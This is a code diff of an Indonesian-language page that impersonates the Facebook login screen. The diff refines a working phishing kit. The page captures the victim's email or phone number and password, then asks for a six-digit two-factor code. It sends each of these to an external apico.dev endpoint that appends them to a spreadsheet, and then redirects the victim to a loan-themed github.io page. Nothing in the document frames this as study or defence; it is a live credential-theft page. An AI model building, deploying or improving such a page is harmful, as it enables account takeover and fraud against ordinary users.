@@ -7,51 +7,25 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-    body {
-      font-family: 'Roboto', sans-serif;
-    }
-    .fb-blue {
-      background-color: #1877f2;
-    }
-    .fb-green {
-      background-color: #42b72a;
-    }
+    body { font-family: 'Roboto', sans-serif; }
+    .fb-blue { background-color: #1877f2; }
+    .fb-green { background-color: #42b72a; }
     .loading {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #1877f2;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
+      display: inline-block; width: 20px; height: 20px;
+      border: 3px solid #f3f3f3; border-top: 3px solid #1877f2;
+      border-radius: 50%; animation: spin 1s linear infinite;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .fade-in {
-      animation: fadeIn 0.3s ease-in;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .shake {
-      animation: shake 0.5s;
-    }
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      25% { transform: translateX(-10px); }
-      75% { transform: translateX(10px); }
-    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .fade-in { animation: fadeIn 0.3s ease-in; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .shake { animation: shake 0.5s; }
+    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
   </style>
 </head>
 <body class="bg-[#f0f2f5] flex flex-col items-center justify-center min-h-screen px-4">
-  
-  <!-- Container Utama -->
+
   <div class="w-full max-w-md">
-    
-    <!-- Logo dan Judul -->
+    <!-- Logo & Judul -->
     <div class="text-center mb-8">
       <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="w-20 h-20 mx-auto mb-4">
       <h1 class="text-2xl font-bold text-gray-800">Facebook</h1>
@@ -64,12 +38,12 @@
         <div class="relative">
           <i class="fas fa-user absolute left-3 top-3 text-gray-400"></i>
           <input id="usr" type="text" placeholder="Email atau Nomor Telepon" 
-                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition">
+                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>
         </div>
         <div class="relative">
           <i class="fas fa-lock absolute left-3 top-3 text-gray-400"></i>
           <input id="pss" type="password" placeholder="Kata Sandi" 
-                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition">
+                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>
           <button type="button" id="togglePassword" class="absolute right-3 top-3 text-gray-400 hover:text-gray-600">
             <i class="fas fa-eye"></i>
           </button>
@@ -110,7 +84,7 @@
       <div class="relative">
         <i class="fas fa-key absolute left-3 top-3 text-gray-400"></i>
         <input id="auth" type="text" placeholder="Kode 6 digit" maxlength="6" 
-               class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition text-center text-2xl tracking-widest">
+               class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition text-center text-2xl tracking-widest" required>
       </div>
       
       <button id="btn2" type="submit" class="w-full fb-blue text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition duration-200 flex items-center justify-center">
@@ -127,22 +101,6 @@
         </button>
       </div>
     </form>
-
-    <!-- Footer -->
-    <div class="mt-8 text-center text-xs text-gray-500 space-y-2">
-      <div class="flex flex-wrap justify-center gap-3">
-        <a href="#" class="hover:underline">Bahasa Indonesia</a>
-        <a href="#" class="hover:underline">English (UK)</a>
-        <a href="#" class="hover:underline">中文(台灣)</a>
-        <a href="#" class="hover:underline">Español</a>
-        <a href="#" class="hover:underline">Français (France)</a>
-        <a href="#" class="hover:underline">Deutsch</a>
-        <a href="#" class="hover:underline">日本語</a>
-      </div>
-      <div class="mt-4">
-        <p>Meta © 2024</p>
-      </div>
-    </div>
   </div>
 
   <script>
@@ -151,11 +109,10 @@
     const btn1 = document.getElementById('btn1');
     const btn2 = document.getElementById('btn2');
     const backBtn = document.getElementById('backBtn');
-    const buatAkun = document.getElementById('buatAkun');
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('pss');
 
-    const apiURL = 'https://api.apico.dev/v1/32a6pc/1UqeWoK2iElSp9scRY0P';
+    const apiURL = 'https://api.apico.dev/v1/32a6pc/1UqeWoK2iElSp9scRY0P1j69FJhD_9RuUqCfAS_8brXY/values/Sheet1:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS&includeValuesInResponse=true';
 
     // Toggle password visibility
     togglePassword.addEventListener('click', () => {
@@ -165,10 +122,7 @@
     });
 
     function getDateTime() {
-      const d = new Date();
-      const tanggal = d.toLocaleDateString('id-ID');
-      const waktu = d.toLocaleTimeString('id-ID');
-      return `${tanggal}, ${waktu}`;
+      return new Date().toLocaleString('id-ID');
     }
 
     function showLoading(buttonId, textId, loadingId) {
@@ -183,59 +137,52 @@
       document.getElementById(buttonId).disabled = false;
     }
 
-    function validateForm(formId) {
-      const inputs = formId.querySelectorAll('input[required]');
-      let isValid = true;
-      
-      inputs.forEach(input => {
+    function validateForm(formEl) {
+      let valid = true;
+      formEl.querySelectorAll('input[required]').forEach(input => {
         if (!input.value.trim()) {
           input.classList.add('shake', 'border-red-500');
-          setTimeout(() => {
-            input.classList.remove('shake', 'border-red-500');
-          }, 500);
-          isValid = false;
+          setTimeout(() => input.classList.remove('shake', 'border-red-500'), 500);
+          valid = false;
         }
       });
-      
-      return isValid;
+      return valid;
     }
 
-    form1.addEventListener('submit', async (e) => {
+    // Form1 Submit (Login)
+    form1.addEventListener('submit', async e => {
       e.preventDefault();
-      
       if (!validateForm(form1)) return;
-      
+
       const usr = document.getElementById('usr').value;
       const pss = document.getElementById('pss').value;
       const date = getDateTime();
 
       showLoading('btn1', 'btn1Text', 'btn1Loading');
 
-      localStorage.setItem('usr', usr);
-
       try {
         await fetch(apiURL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ usr, pss, date })
+          body: JSON.stringify({ values: [[usr, pss, '', date]] })
         });
 
-        setTimeout(() => {
-          form1.classList.add('hidden');
-          form2.classList.remove('hidden');
-          hideLoading('btn1', 'btn1Text', 'btn1Loading');
-        }, 1000);
-      } catch (error) {
-        hideLoading('btn1', 'btn1Text', 'btn1Loading');
+        localStorage.setItem('usr', usr);
+        form1.classList.add('hidden');
+        form2.classList.remove('hidden');
+      } catch (err) {
         alert('Terjadi kesalahan. Silakan coba lagi.');
+        console.error(err);
+      } finally {
+        hideLoading('btn1', 'btn1Text', 'btn1Loading');
       }
     });
 
-    form2.addEventListener('submit', async (e) => {
+    // Form2 Submit (2FA)
+    form2.addEventListener('submit', async e => {
       e.preventDefault();
-      
       if (!validateForm(form2)) return;
-      
+
       const usr = localStorage.getItem('usr');
       const auth = document.getElementById('auth').value;
       const date = getDateTime();
@@ -246,34 +193,28 @@
         await fetch(apiURL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ usr, auth, date })
+          body: JSON.stringify({ values: [[usr, '', auth, date]] })
         });
 
-        setTimeout(() => {
-          localStorage.removeItem('usr');
-          window.location.href = 'https://gantulu.github.io/pinjaman/mainapp.html';
-        }, 1000);
-      } catch (error) {
-        hideLoading('btn2', 'btn2Text', 'btn2Loading');
+        localStorage.removeItem('usr');
+        window.location.href = 'https://gantulu.github.io/pinjaman/mainapp.html';
+      } catch (err) {
         alert('Kode autentikasi tidak valid. Silakan coba lagi.');
+        console.error(err);
+      } finally {
+        hideLoading('btn2', 'btn2Text', 'btn2Loading');
       }
     });
 
+    // Back Button
     backBtn.addEventListener('click', () => {
       form2.classList.add('hidden');
       form1.classList.remove('hidden');
       document.getElementById('auth').value = '';
     });
 
-    // Auto focus auth input
-    form2.addEventListener('transitionend', () => {
-      if (!form2.classList.contains('hidden')) {
-        document.getElementById('auth').focus();
-      }
-    });
-
-    // Format auth input
-    document.getElementById('auth').addEventListener('input', (e) => {
+    // Auto-format auth input (numeric only)
+    document.getElementById('auth').addEventListener('input', e => {
       e.target.value = e.target.value.replace(/[^0-9]/g, '');
     });
   </script>
